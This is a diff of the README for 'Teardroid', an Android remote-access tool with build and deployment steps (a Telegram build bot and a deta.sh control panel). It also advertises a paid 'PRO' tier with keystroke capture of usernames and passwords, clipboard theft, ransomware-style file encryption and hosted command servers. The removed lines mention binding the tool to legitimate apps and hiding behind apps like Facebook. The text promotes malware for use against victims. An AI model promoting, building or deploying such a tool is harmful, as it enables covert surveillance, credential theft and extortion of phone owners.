@@ -78,6 +78,7 @@ $ python Teardroid.py -b your_app_name
 
 ### :city_sunset: Build using bot
 - Build Teardroid using [teardroid_bot](https://t.me/teardroid_bot) in telegram
+
 ### Manually deploy the Teardroid control panel
 - Set up an account at [deta.sh](https://web.deta.sh/)
 - Install [Deta Cli](https://docs.deta.sh/docs/cli/install)
@@ -109,14 +110,17 @@ $ deta deploy
 #### :stars: PRO Features
 - Get users key strokes (whatever they type in there keyboard like username password etc)
 - Get users clipboard data (get whatever is copied in there clipboard)
-- A Guide about how you can manually bind teardroid pro with any legitimate app
-- Ability to hide behind any other legitimate app without binding (like : Facebook, Twitter, LinkedIn etc)
+- Add webview in the app
 - Encrypt files with AES encryption (work as ransomware)
 - Robust connection with server we will setup everything for you on aws or any other self hosting server
 - 24x7 support for 3 month (any kind of help or support related to teardroid will be given by our team)
 
 ### Support me
 [!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/script1337x)
+
+### Beware from scams
+- Make sure the bot username is @teardroid_bot beware from scam
+- I am only available on telegram and script1337 is my only account
 
 ### Contact info 
 - Email : script@hacksec.in
